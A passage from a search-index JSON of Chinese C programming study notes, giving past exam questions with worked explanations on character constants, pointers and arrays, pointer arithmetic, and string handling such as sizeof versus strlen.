\u6ca1\u6709\u8fd9\u79cd\u8868\u793a\u65b9\u6cd5\uff0c\u662f\u8bed\u6cd5\u9519\u8bef\u7684\uff1bC. 0x124 \u662f\u5341\u516d\u8fdb\u5236\u8868\u793a\u6cd5\uff0c\u7b49\u4e8e\u5341\u8fdb\u5236\u7684 292\uff1bD. 0174 \u516b\u8fdb\u5236\uff0c\u7b49\u4e8e\u5341\u8fdb\u5236 124\uff0c\u9009 D</p> </li> <li> <p>(C16A) In the following notations, _____ can express a character constant(\u5b57\u7b26\u5e38\u91cf) correctly.      A. '\\x100' B. 125 C. '\\08' D. '\\' </p> <p>Success</p> <p>A. '\\x100' \u662f\u5341\u516d\u8fdb\u5236\u8868\u793a\u6cd5\uff0c\u4f46\u662f\u8d85\u51fa\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u8303\u56f4\uff0c\u662f\u8bed\u6cd5\u9519\u8bef\u7684\uff1bB. 125 \u901a\u8fc7\u4e00\u4e2a\u6574\u6570\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u800c\u4e14\u5728 ASCII \u7801\u8303\u56f4\u5185\uff0c\u80af\u5b9a\u662f\u5408\u6cd5\u7684\uff08\u5b9e\u9645\u4e0a\u8868\u793a\u7684\u5c31\u662f\u5b57\u7b26 '}'\uff09\uff1bC. '\\08' \u524d\u9762\u8bf4\u8fc7\u4e86\uff0c\\0 8 \u662f\u4e24\u4e2a\u5b57\u7b26\uff0c\u6324\u5230\u4e86\u4e00\u4e2a\u5355\u5f15\u53f7\u91cc\uff0c\u662f\u9519\u8bef\u7684\u7528\u6cd5\uff1bD. '\\' \u4e2d  \u4f1a\u5c06 ' \u8f6c\u4e49\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u8fd9\u4e2a\u5355\u5f15\u53f7\u6ca1\u6709\u95ed\u5408\uff0c\u662f\u8bed\u6cd5\u9519\u8bef\u7684\u3002\u6240\u4ee5\u9009 B\u3002</p> </li> <li> <p>(C17A) In the following notations, _____ can NOT express a single-character constant(\u5355\u5b57\u7b26\u5e38\u91cf) correctly.       A. '%c' B. 127 C. '\\077' D. 55 </p> <p>Success</p> <p>A. '%c' \u540c\u6837\u662f\u4e24\u4e2a\u5b57\u7b26\u6324\u5230\u4e86\u4e00\u4e2a\u5355\u5f15\u53f7\u91cc\uff0c\u662f\u9519\u8bef\u7528\u6cd5\uff1bBCD \u90fd\u53ef\u4ee5\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u9009 A</p> </li> <li> <p>\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u54ea\u4e2a\u662f\u4e0d\u6b63\u786e\u7684 _____.      A. 0.5%2 B. 3&amp;(0.5+0.5) C. 4.6&lt;&lt;2 D. 2==(3/2) </p> <p>Success</p> <p>\u8981\u6ce8\u610f\u8fd0\u7b97\u7b26\u4e24\u4fa7\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53ea\u6709 D \u7684 == \u4e24\u4fa7\u90fd\u662f int\uff0c\u662f\u5408\u6cd5\u7684\u3002\u800c ABC \u7684\u64cd\u4f5c\u6570\u90fd\u51fa\u73b0\u4e86 double \u7c7b\u578b\uff0c% &amp; &lt;&lt; \u8fd0\u7b97\u7b26\u4e0d\u80fd\u7528\u5728 double \u4e0a\uff0c\u8bed\u6cd5\u9519\u8bef\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_10","title":"\u6570\u7ec4\u4e0e\u6307\u9488","text":"<p>\u6307\u9488\u662f C \u8bed\u8a00\u7684\u7075\u9b42\uff0c\u4e5f\u662f\u8003\u8bd5\u5e38\u8003\u6613\u9519\u7684\u77e5\u8bc6\u70b9\uff0c\u7279\u522b\u662f\u548c\u6570\u7ec4\u4e00\u8d77\u51fa\u73b0\u65f6\u3002</p> <p>\u51e0\u4e2a\u9700\u8981\u8bb0\u4f4f\u7684\u77e5\u8bc6\u70b9\uff1aa[b] \u548c *(a+b) \u5728\u4f7f\u7528\u65f6\u5b8c\u5168\u7b49\u4ef7\uff1b\u4e8c\u7ef4\u6570\u7ec4\u65e0\u6cd5\u9000\u5316\u4e3a\u4e8c\u7ea7\u6307\u9488\uff1b\u6570\u7ec4\u540d\u4e0d\u80fd\u88ab\u91cd\u65b0\u8d4b\u503c\u3002</p> <ol> <li> <p>(C13A) Given the declaration: <code>int a[10], *p=a;</code>\uff0cthe expression _____ is NOT correct.      A. a[9] B. p[5] C. *p++ D. a++ </p> <p>Success</p> <p>a \u662f\u4e00\u4e2a\u6570\u7ec4\uff0cp \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5c06 a \u8d4b\u503c\u7ed9 p \u65f6\u5373\u5c06 a \u7684\u9996\u5730\u5740\u8d4b\u503c\u7ed9 p\u3002 a[9] \u80af\u5b9a\u662f\u5408\u6cd5\u7684\uff0c\u56e0\u4e3a p[5] \u7b49\u4ef7\u4e8e *(p+5)\uff0c\u4e5f\u662f\u5408\u6cd5\u7684\uff0c*p++ \u53d6\u4e86\u5f53\u524d p \u6307\u5411\u7684\u503c\uff0c\u5e76\u5c06 p \u6307\u9488 ++\uff0c\u662f\u5408\u6cd5\u7684\u3002 \u800c D. a++ \u4e2d\u5305\u542b\u4e86\u5bf9 a \u7684\u91cd\u65b0\u8d4b\u503c\uff08\u5c06 a+1 \u8d4b\u503c\u7ed9 a\uff09\uff0c\u7531\u4e8e\u6570\u7ec4\u540d\u4e0d\u80fd\u88ab\u8d4b\u503c\uff0c\u6240\u4ee5\u662f\u9519\u8bef\u7684\uff0c\u9009 D\u3002</p> </li> <li> <p>(C13A) Given the declaration: <code>int a[3][3]={1,2,3,4,5,6,7,8,9};</code>, the value of <code>a[-1][5]</code> is _____.</p> <p>Success</p> <p>\u9996\u5148\u6765\u770b a[-1]\uff0c\u5373 (a-1)\uff0ca-1 \u4f1a\u4ee5\u4e09\u4e2a int \u4e3a\u5355\u4f4d\u5411\u5de6\u79fb\u52a8\uff0c\u5373 (a-1) \u662f\u4e00\u4e2a\u6307\u5411\u5982\u4e0b\u4f4d\u7f6e\u7684\u6307\u9488\uff1a <pre><code>   0 0 0 1 2 3 4 5 6 7 8 9\n   ^\n   |\n*(a-1) = p\n</code></pre> \u73b0\u5728\u6211\u4eec\u5c06 a[-1] \u4e5f\u5c31\u662f *(a-1) \u89c6\u4e3a p\uff0c\u90a3\u6211\u4eec\u8981\u627e\u7684\u7ed3\u679c\u5c31\u662f p[5]\uff0c\u6b64\u65f6 p \u662f\u4e00\u4e2a\u6307\u5411 int \u7c7b\u578b\u7684\u6307\u9488\uff0c*(p+5) \u5c31\u76f8\u5f53\u4e8e\u627e\u5230\u5b83\u6307\u5411\u7684\u4f4d\u7f6e\u53f3\u4fa7\u7b2c 5 \u4e2a int \u7684\u503c\uff0c\u4e5f\u5c31\u662f 3\u3002</p> </li> <li> <p>(C14A) Given the declaration: <code>int a[3][2]={1,2,3,4,5,6};</code> what is the value of expression <code>(a[1]+1)[0]</code>? _____.</p> <p>Success</p> <p>\u540c\u4e0a\u9898\u4e00\u6837\u5206\u6790\u5373\u53ef\uff0c\u65f6\u523b\u8bb0\u5f97 a[b] \u7b49\u4ef7\u4e8e *(a+b)\u3002\u4ee5\u4e0b\u662f\u8d3a\u8001\u5e08\u66fe\u7ecf\u7684\u56fe\uff1a <pre><code>a -&gt; {\na[0] -&gt; {1, 2}\na[1] -&gt; {3, 4}\n            ^\n            +--- a[1] + 1\na[2] -&gt; {5, 6}\n     }\n</code></pre> \u6240\u4ee5 (a[1]+1)[0] \u5c31\u662f *(a[1]+1) = 4</p> </li> <li> <p>(C15A/C16A) For the declarations: <code>char *s, str[10];</code>, statement _____ is completely correct.      A. strcpy(s, \"hello\"); B. str=\"hello\"+1 C. s=*&amp;(str+1) D. s=str+1 </p> <p>Success</p> <p>\u8fd9\u91cc\u6d89\u53ca\u5230\u4e86\u4e00\u4e2a\u91ce\u6307\u9488\u7684\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u4e13\u95e8\u6709\u4e00\u4e2a\u90e8\u5206</p> <p>A. \u5c06 \"hello\" \u62f7\u8d1d\u5230 s \u6307\u5411\u7684\u7a7a\u95f4\u3002\u4f46\u662f s \u6307\u5411\u4ec0\u4e48\u5462\uff1f\u4f60\u5e76\u4e0d\u6e05\u695a\uff0c\u4e5f\u5c31\u662f\u8bf4 s \u662f\u4e00\u4e2a\u91ce\u6307\u9488\uff0c\u4f60\u4e0d\u6e05\u695a\u5b83\u6307\u5411\u54ea\u91cc\uff0c\u4e5f\u5c31\u81ea\u7136\u4e0d\u80fd\u5411\u5b83\u6307\u5411\u7684\u7a7a\u95f4\u4e2d\u5199\u5165\u6570\u636e B. str \u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u540d\u4e0d\u80fd\u88ab\u8d4b\u503c\uff0c\u6240\u4ee5\u662f\u9519\u7684 C. str+1 \u4e0d\u80fd\u88ab\u53d6\u5730\u5740\uff0c\u56e0\u4e3a\u8fd9\u662f\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u6570\uff0c\u800c\u4e0d\u662f\u5b9e\u9645\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u6570\uff0c\u6240\u4ee5\u662f\u9519\u7684 D. str+1 \u8868\u793a\u7684\u5c31\u662f str \u6570\u7ec4\u4e2d\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684\u5730\u5740\uff0c\u5c06\u5176\u8d4b\u503c\u7ed9 s\uff0c\u662f\u6b63\u786e\u7684</p> </li> <li> <p>(C16A) Given: <code>double a[]={1, 2, 3, 4, 5};</code>, the value of expression <code>(int)&amp;a[3] - (int)&amp;a[0]</code> is _____</p> <p>Success</p> <p>\u7531\u4e8e\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u90fd\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff0c\u6240\u4ee5 a[3] \u7684\u5730\u5740\u51cf\u53bb a[0] \u7684\u5730\u5740\u5c31\u662f a[3] \u4e0e a[0] \u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u4e5f\u5c31\u662f 3 \u4e2a double \u7c7b\u578b\u7684\u5927\u5c0f\uff0c\u5373 3 * sizeof(double) = 24</p> <p>\u8fd9\u91cc\u9700\u8981\u548c 17 \u9898\u8fdb\u884c\u4e00\u4e0b\u5bf9\u6bd4\uff0c17 \u9898\u91cc\u6211\u4eec\u518d\u8be6\u7ec6\u8bf4\u660e</p> </li> <li> <p>(C17A) The following code fragment will output _____.     <pre><code>char *week[]={\"Mon\", \"Tue\",\"Wed\",\"Thu\",\"Fri\",\"Sat\",\"Sun\"}, **pw=week;\nchar c1, c2;\nc1 = (*++pw)[1];\nc2 = *++pw[1];\nprintf(\"%c#%c#\", c1, c2);\n</code></pre></p> <p>Success</p> <p>\u9996\u5148 c1 = (*++pw)[1]\uff0c++pw \u4f7f pw \u6307\u5411\u4e86 week[1]\uff0c\u7136\u540e (*++pw) \u5c31\u662f week[1]\uff0c\u518d [1] \u5c31\u662f week[1][1] \u4e5f\u5c31\u662f 'u' \u7136\u540e c2 = *++pw[1]\uff0c\u8fd9\u91cc\u7684\u7406\u89e3\u65b9\u5f0f\u4e00\u5b9a\u662f\u5bf9 pw[1] \u8fdb\u884c ++\uff0cpw[1] \u6b64\u65f6\u662f week[2]\uff0c\u7136\u540e\u5c06\u5176\u81ea\u589e\u5f97\u5230\u6307\u5411 week[2][1] \u7684\u6307\u9488\uff0c\u518d\u89e3\u5f15\u7528\u5f97\u5230 'e'</p> </li> <li> <p>(C17A) For the declaration: <code>int a[3][4]={{0,1,2},{4,5,6},{7,8}};</code>, the value of the element of <code>a[1][-2]</code> is _____. </p> <p>Success</p> <p>\u548c 11\u300112 \u9898\u7c7b\u4f3c\u5206\u6790\u5373\u53ef <pre><code>a -&gt; {\n    a[0] -&gt; {0, 1, 2, 0}\n                   ^\n                   +---- a[1][-2]\n    a[1] -&gt; {4, 5, 6, 0}\n    a[2] -&gt; {7, 8, 0, 0}\n}\n</code></pre></p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>int a[] = {1, 2, 3, 4, 5};\nint *p = a, *q = &amp;a[2];\nprintf(\"%lu\", q-p);\n</code></pre></p> <p>Success</p> <p>\u9996\u5148\u8fd9\u9053\u9898\u7684\u8f93\u51fa\u662f 2 \u800c\u4e0d\u662f 2*sizeof(int)=8\uff0c\u56e0\u4e3a q\u3001p \u6307\u9488\u76f8\u51cf\u7684\u610f\u4e49\u5b9e\u9645\u4e0a\u662f\u8ba1\u7b97\u4e24\u4e2a\u6307\u9488\u5dee\u4e86\u51e0\u4e2a\u201c\u5355\u4f4d\u201d\u7684\u8ddd\u79bb\uff0c\u8fd9\u91cc\u4e00\u4e2a\u5355\u4f4d\u5c31\u662f\u4e00\u4e2a int \u7684\u957f\u5ea6\uff0c\u5b83\u4eec\u5dee\u4e86\u4e24\u4e2a int\uff0c\u6240\u4ee5\u662f 2</p> <p>\u6307\u9488\u76f8\u51cf\u5e76\u4e0d\u662f\u5c06\u5176\u503c\uff08\u4e5f\u5c31\u662f\u5730\u5740\uff09\u76f8\u51cf\uff0c\u5982\u679c\u8fd9\u662f\u9884\u671f\u884c\u4e3a\uff0c\u90a3\u4e48\u5e94\u8be5\u4f7f\u7528\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5\uff1a <pre><code>printf(\"%d\", (int)q - (int)p); // \u5373 14 \u9898\u4e2d\u5199\u6cd5\nprintf(\"%d\", (char*)q - (char*)p); // \u8f6c\u4e3a char* \u7c7b\u578b\u6307\u9488\uff0c\u5355\u4f4d\u5c31\u662f\u4e00\u4e2a\u5b57\u8282\uff0c\u548c\u5730\u5740\u76f8\u51cf\u6548\u679c\u76f8\u540c\n</code></pre></p> </li> <li> <p>\u4ee5\u4e0b\u54ea\u4e2a\u5b9a\u4e49\u4e2d p \u4e0d\u662f\u6307\u9488 _____.     A. char **p;     B. char (*p)[10];     C. char *p[6];     D. \u524d\u4e09\u9879\u4e2d p \u90fd\u662f\u6307\u9488</p> <p>Success</p> <p>\u8be6\u7ec6\u5206\u6790\u53ef\u4ee5\u770b\u8d3a\u8001\u5e08\u300a\u6d45\u8c08 C \u8bed\u8a00\u7684\u6570\u636e\u7c7b\u578b\u300b\u4e2d\u63cf\u8ff0\u7684 Clockwise/Spiral Rule</p> <p>A \u4e2d p \u663e\u7136\u662f\u4e00\u4e2a\u4e8c\u7ea7\u6307\u9488\uff0cB \u4e2d p \u662f\u4e00\u4e2a\u6307\u5411\u957f\u5ea6\u4e3a 10 \u7684\u6570\u7ec4\u7684\u6307\u9488\uff0cC \u4e2d p \u662f\u4e00\u4e2a\u957f\u5ea6\u4e3a 6 \u7684\u6307\u9488\u6570\u7ec4\uff08\u5373\u4e00\u4e2a\u6570\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u662f\u6307\u9488\uff09</p> <p>\u8fd8\u6709\u4e00\u70b9\u8981\u6ce8\u610f\uff0c\u6570\u7ec4\u548c\u6307\u9488\u662f\u4e24\u79cd\u7c7b\u578b</p> </li> <li> <p>\u5bf9\u4e8e\u51fd\u6570\u58f0\u660e <code>void f(char **p)</code>\uff0c\u4ee5\u4e0b\u54ea\u4e2a var \u7684\u5b9a\u4e49\u4f1a\u4f7f f(var) \u8bed\u6cd5\u9519\u8bef _____.     A. char var[10][10];     B. char *var[10];     C. void *var = NULL;     D. char *v=NULL, **var=&amp;v;</p> <p>Success</p> <p>BD \u4e00\u822c\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u5927\u90e8\u5206\u540c\u5b66\u4e0d\u7406\u89e3 A \u548c C</p> <p>A. \u4e8c\u7ef4\u6570\u7ec4\u4e0d\u80fd\u9000\u5316\u4e3a\u4e8c\u7ea7\u6307\u9488\uff0c\u6240\u4ee5\u80af\u5b9a\u662f\u9519\u7684 C. \u5728 C \u8bed\u8a00\u4e2d\uff0cvoid* \u8868\u793a\u300c\u6307\u5411\u4efb\u610f\u7c7b\u578b\u7684\u6307\u9488\u300d\uff0c\u800c\u8fd9\u4e2a\u300c\u4efb\u610f\u7c7b\u578b\u300d\u4e5f\u53ef\u4ee5\u662f char*\uff08\u5373\u6307\u5411 char \u7684\u6307\u9488\uff09\uff0c\u6240\u4ee5\u5b83\u53ef\u4ee5\u4ee3\u8868\u300c\u6307\u5411\u6307\u5411 char \u7684\u6307\u9488\u7684\u6307\u9488\u300d\uff08char**\uff09\uff0c\u6240\u4ee5\u662f\u5bf9\u7684</p> </li> <li> <p>\u5bf9\u4e8e\u5b9a\u4e49 <code>char s[2][3] = {\"ab\", \"cd\"}, *p=(char*)s</code>\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u8868\u8fbe\u5f0f\u662f\u6b63\u786e\u7684\u4e14\u503c\u7b49\u4e8e s[1][1] _____.      A. *(s+3) B. *s+2 C. p[1][1] D. *++p+2 </p> <p>Success</p> <p><pre><code>s -&gt; {\n    s[0] -&gt; {'a', 'b', '\\0'}\n    s[1] -&gt; {'c', 'd', '\\0'}\n}\n</code></pre> A. *(s+3) \u7b49\u4ef7\u4e8e s[3]\uff0c\u9996\u5148\u7c7b\u578b\u4e0a\u5b83\u5c31\u4e0d\u5bf9 B. \u540c\u6837 *s+2 \u4e5f\u662f\u6307\u9488\uff0c\u7c7b\u578b\u4e0a\u5c31\u80af\u5b9a\u4e0d\u5bf9 C. p \u6b64\u65f6\u662f char* \u7c7b\u578b\uff0c\u4e0d\u80fd\u8fdb\u884c\u4e24\u6b21\u89e3\u5f15\u7528\uff0c\u8bed\u6cd5\u9519\u8bef D. ++p \u5c06 p \u6307\u5230\u4e86 'b' \u5934\u4e0a\uff0c\u89e3\u5f15\u7528\u5f97\u5230 'b' \u518d\u52a0\u4e8c\u5f97\u5230 'd' \u7b49\u4e8e s[1][1]\uff0c\u9009 D</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_11","title":"\u5b57\u7b26\u4e32\u76f8\u5173","text":"<p>\u5b57\u7b26\u4e32\u4e5f\u662f\u4e00\u4e2a\u5f88\u5bb9\u6613\u51fa\u9519\u7684\u8003\u70b9\uff0c\u6211\u63a8\u8350\u7684\u7406\u89e3\u65b9\u5f0f\u662f\uff1aC \u8bed\u8a00\u4e2d\u4e0d\u5b58\u5728\u5b57\u7b26\u4e32\uff0c\u53ea\u6709\u5b57\u7b26\u6570\u7ec4\uff0c\u800c\u5b57\u7b26\u4e32\u662f\u4e00\u79cd\u5bf9\u4e8e\u5b57\u7b26\u6570\u7ec4\u7684\u4eba\u4e3a\u7406\u89e3\u65b9\u5f0f\uff0c\u5373\u4ece\u5f00\u5934\u76f4\u5230\u7b2c\u4e00\u4e2a '\\0' \u6807\u5fd7\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u6240\u4ee5 \"abc\" \u548c {'a', 'b', 'c', '\\0'} \u662f\u7b49\u4ef7\u7684\u3002</p> <p>\u53e6\u4e00\u4e2a\u9700\u8981\u7262\u8bb0\u7684\u77e5\u8bc6\u70b9\u662f\uff0c\u5f53\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u65f6\u5019\uff0c\u8981\u5c06\u5176\u89c6\u4e3a\u6307\u5411\u8be5\u5b57\u7b26\u4e32\u7684\u9996\u5b57\u7b26\u7684\u6307\u9488\u6765\u5904\u7406\u3002\u800c\u4e14\u5728\u521d\u59cb\u5316\u5b57\u7b26\u6570\u7ec4\u65f6\u9664\u5916\uff08char s[] = \"abc\"; \u5e76\u4e0d\u662f\u628a \"abc\" \u9996\u5b57\u7b26\u5730\u5740\u8d4b\u503c\u7ed9\u4e86 s\uff09\u3002</p> <p>\u5bf9\u4e8e char *s = \"abc\" \u548c char s[] = \"abc\" \u6211\u4eec\u5728\u7b2c 31 \u9898\u4e2d\u518d\u8be6\u7ec6\u8fdb\u884c\u533a\u5206\u3002</p> <ol> <li> <p>(C13A) Given: <code>char format[] = \"No.%d%c\"</code>; the statement <code>printf(format, 3, *(\"xyz\"+2));</code> will print out _____.</p> <p>Success</p> <p>\"xyz\" \u8fd9\u91cc\u5f53\u4f5c\u6307\u5411 'x' \u7684\u6307\u9488\uff0c\u52a0 2 \u5219\u6307\u5230\u4e86 'z'\uff0c\u89e3\u5f15\u7528\u5c31\u5f97\u5230\u4e86 'z' \u8fd9\u4e2a\u5b57\u7b26\u3002\u6240\u4ee5\u8f93\u51fa\u4e3a No.3z</p> </li> <li> <p>(C14A/C15A) Given the following code fragment, the loop condition <code>str[i]!='\\0'</code> could be replaced by which choice? _____.     <pre><code>char str[20]=\"hello, world\";\nfor (i = 0; str[i] != '\\0'; i++) putchar(str[i]);\n</code></pre> A. str[i] B. i &lt; 20 C. !(str[i] = '\\0') D. i &lt;= 20 </p> <p>Success</p> <p>\u8fd8\u8981\u8bb0\u4f4f\u7684\u4e00\u70b9\u662f\uff0c'\\0' \u5c31\u662f 0\uff0c\u6240\u4ee5\u8fd9\u9898\u91cc str[i] != '\\0' \u548c A \u662f\u5b8c\u5168\u7b49\u4ef7\u7684\u3002\uff08C \u5dee\u4e86\u4e00\u4e2a\u7b49\u53f7\uff09 B \u9519\u8bef\u7684\u539f\u56e0\u662f\uff0c'\\0' \u4e5f\u662f\u5b57\u7b26\uff0c\u8fd9\u6837\u5c31\u4e00\u5b9a\u4f1a\u8f93\u51fa 20 \u4e2a\u5b57\u7b26\u6765\uff0c\u5373\u4f7f\u5b9e\u9645\u4e0a\u4f60\u770b\u4e0d\u89c1 '\\0' \u8fd9\u4e2a\u5b57\u7b26\uff0c\u4f46\u5b83\u4eec\u786e\u5b9e\u88ab\u8f93\u51fa\u4e86</p> </li> <li> <p>(C14A) The value of expression <code>!*(\"2015-01-28\"+5)</code> is _____</p> <p>Success</p> <p>\u5b57\u7b26\u4e32\u5e38\u91cf\u51fa\u73b0\u5728\u7a0b\u5e8f\u91cc\u5f53\u4f5c\u6307\u5411\u9996\u5b57\u7b26\u7684\u6307\u9488\u5904\u7406\uff0c\u6240\u4ee5 \"2015-01-28\"+5 \u5373\u8868\u793a\u6307\u5411 '0' \u4f4d\u7f6e\u7684\u6307\u9488\uff0c\u89e3\u5f15\u7528\u5f97\u5230 '0'\u3002\u6240\u4ee5\u8fd9\u9898\u5316\u4e3a\u4e86 !'0' \u7684\u503c\u3002</p> <p>\u4e00\u5b9a\u8981\u533a\u5206\u6e05\u695a '0' \u548c '\\0'\uff0c'0'==48 \u800c '\\0'==0\uff0c\u6240\u4ee5 !'0' \u662f !48 \u5373 0</p> </li> <li> <p>(C14A) The output of the code below is _____.     <pre><code>char x[] = \"hello,world\\012345\";\nprintf(\"%d#%d#\"\uff0csizeof(x)\uff0cstrlen(x));\n</code></pre></p> <p>Success</p> <p>\u590d\u4e60\u4e00\u4e0b\u524d\u9762\u8bf4\u8fc7\u7684\u5b57\u7b26\u5b57\u9762\u91cf\u7684\u8868\u793a</p> <p>\u8fd9\u91cc x \u5c31\u76f8\u5f53\u4e8e 'h', 'e', 'l', 'l', 'o', ',', 'w', 'o', 'r', 'l', 'd', '\\012', '3', '4', '5', '\\0'\uff0c\u6240\u4ee5 sizeof(x) \u8ba1\u7b97\u5360\u4e86\u591a\u5c11\u7a7a\u95f4\uff0c\u4e00\u5171 16 \u4e2a\u5b57\u8282\uff0c\u7ed3\u679c\u4e3a 16\u3002\u800c strlen(x) \u8ba1\u7b97\u7b2c\u4e00\u4e2a '\\0' \u524d\u6709\u51e0\u4e2a\u5b57\u7b26\uff0c\u8fd9\u91cc\u6709 15 \u4e2a\uff08'\\012' \u4e2d\u7684 \\0 \u5e76\u4e0d\u7b97 '\\0'\uff09\uff0c \u7ed3\u679c\u4e3a 15\u3002</p> </li> <li> <p>(C17A) The value of expression <code>!\"01-21-2018\"[7]</code> is _____</p> <p>Success</p> <p>\u540c 23 \u9898\uff0c\u8fd9\u91cc \"01-21-2018\"[7] \u6307\u5411\u4e86 '0'\uff0c!'0' \u4e3a 0</p> </li> <li> <p>(C17A) Given: <code>char s[]=\"123\\029\\08\";</code>, then <code>sizeof(s)</code> and <code>strlen(s)</code> will be _____ respectively.</p> <p>Success</p> <p>\u540c 24 \u9898\uff0c\u8fd9\u91cc s \u5b57\u7b26\u6570\u7ec4\u76f8\u5f53\u4e8e '1', '2', '3', '\\02', '9', '\\0', '8', '\\0'\uff0c\u4e00\u5171 8 \u4e2a\uff0c\u6240\u4ee5 sizeof(s) \u4e3a 8\u3002\u7b2c\u4e00\u4e2a '\\0' \u524d\u6709 5 \u4e2a\uff0c\u6240\u4ee5 strlen(s) \u4e3a 5\u3002</p> </li> <li> <p>(C17A) The value of expression <code>strcmp(\"abcabc\",\"aabbcc\"+1) &lt; 0</code> is _____.</p> <p>Success</p> <p>strcmp(s1, s2) \u5f53 s1 &lt; s2 \u65f6\u8fd4\u56de\u4e00\u4e2a\u8d1f\u6570\uff0c\u5f53 s1 &gt; s2 \u65f6\u8fd4\u56de\u4e00\u4e2a\u6b63\u6570\uff0c\u5f53 s1 == s2 \u65f6\u8fd4\u56de 0\u3002\u6240\u4ee5\u8fd9\u9898\u76f8\u5f53\u4e8e\u6bd4\u8f83 \"abcabc\" \u548c \"abbcc\"\uff0c\"abcabc\" &gt; \"abbcc\"\uff0c\u6240\u4ee5\u8fd4\u56de\u4e00\u4e2a\u6b63\u6570\uff0c\u7ed3\u679c\u4e3a 0</p> <p>\u5177\u4f53\u5b57\u7b26\u4e32\u6bd4\u8f83\u5927\u5c0f\u7684\u65b9\u5f0f\u79f0\u4e3a\u201c\u5b57\u5178\u5e8f\u201d\uff0c\u4e5f\u5c31\u662f\u8bf4\u5047\u8bbe\u8fd9\u4e24\u4e2a\u5b57\u7b26\u4e32\u5728\u82f1\u6587\u8bcd\u5178\u4e2d\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u5927\u5c0f\u5173\u7cfb\u5c31\u662f\u5728\u8bcd\u5178\u4e2d\u51fa\u73b0\u7684\u5148\u540e\u5173\u7cfb\uff08\u5148\u51fa\u73b0\u7684\u5c0f\uff09</p> </li> <li> <p>(C18A) The value of expression <code>!(\"01/24/2019\"+5)[5]</code> is _____.</p> <p>Success</p> <p>\u540c 23 \u9898\uff0c\u8fd9\u91cc\u76f8\u5f53\u4e8e !*(\"01/24/2019\"+10)\u3002\u5176\u4e2d\u5b57\u7b26\u4e32\u52a0 10 \u540e\u6307\u5411\u4e86\u7ed3\u5c3e\u9690\u85cf\u7684 '\\0'\uff0c\u800c '\\0' \u5c31\u662f 0\uff0c\u6240\u4ee5\u53d6\u53cd\u4e3a 1</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u6bb5\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>char c[] = \"I\\t\\r\\\\\\0will\\n\";\nprintf(\"%d\", strlen(c));\n</code></pre></p> <p>Success</p> <p>\u540c 24 \u9898\uff0c\u8fd9\u91cc c \u5b57\u7b26\u6570\u7ec4\u76f8\u5f53\u4e8e 'I', '\\t', '\\r', '\\', '\\0', 'w', 'i', 'l', 'l', '\\n', '\\0'\uff0c\u7b2c\u4e00\u4e2a '\\0' \u524d\u6709 4 \u4e2a\uff0c\u6240\u4ee5 strlen(c) \u4e3a 4\u3002</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u6bb5\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>char a[] = \"abc\";\nchar b[] = {'a', 'b', 'c'};\nprintf(\"%d#%d#\", sizeof(a), sizeof(b));\n</code></pre></p> <p>Success</p> <p>\"abc\" \u53ef\u4ee5\u5f53\u4f5c {'a', 'b', 'c', '\\0'}\uff0c\u6240\u4ee5 sizeof(a) \u4e3a 4\uff0csizeof(b) \u4e3a 3\u3002</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u662f\u5426\u5b58\u5728\u9519\u8bef\uff0c\u5982\u679c\u6709\u8bf7\u6307\u51fa\u54ea\u91cc\u6709\u95ee\u9898 _____.     <pre><code>char *a = \"hello\";\nchar b[] = \"hello\";\na[0] = 'H';\nb[0] = 'H';\n</code></pre></p> <p>Success</p> <p>\u8fd9\u91cc\u6211\u4eec\u8981\u533a\u5206\u7684\u662f a \u548c b\u3002a \u5c31\u662f\u4e00\u4e2a\u5b57\u7b26\u6307\u9488\uff0c\u5b83\u6307\u5411\u4e86 \"hello\" \u7684\u5f00\u5934\uff0c\u800c\u8fd9\u4e2a \"hello\" \u5b58\u5728\u4e8e\u9759\u6001\u5b58\u50a8\u533a\u4e2d\uff0c\u662f\u53ea\u8bfb\u7684\uff0c\u4e0d\u80fd\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5 a[0] = 'H' \u4f1a\u5728\u8fd0\u884c\u65f6\u4ea7\u751f\u9519\u8bef\uff08\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff0c\u4f46\u662f\u8fd0\u884c\u4f1a\u62a5\u9519\uff09 \u800c b \u662f\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4\uff0c\u5b83\u81ea\u5e26\u4e86\u6808\u4e0a\u7a7a\u95f4\uff0c\u5728\u521d\u59cb\u5316\u8d4b\u503c\u7684\u65f6\u5019 \"hello\" \u4f1a\u88ab\u590d\u5236\u5230 b \u7684\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5 b[0] = 'H' \u662f\u5408\u6cd5\u7684\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_12","title":"\u91ce\u6307\u9488\u76f8\u5173","text":"<p>13 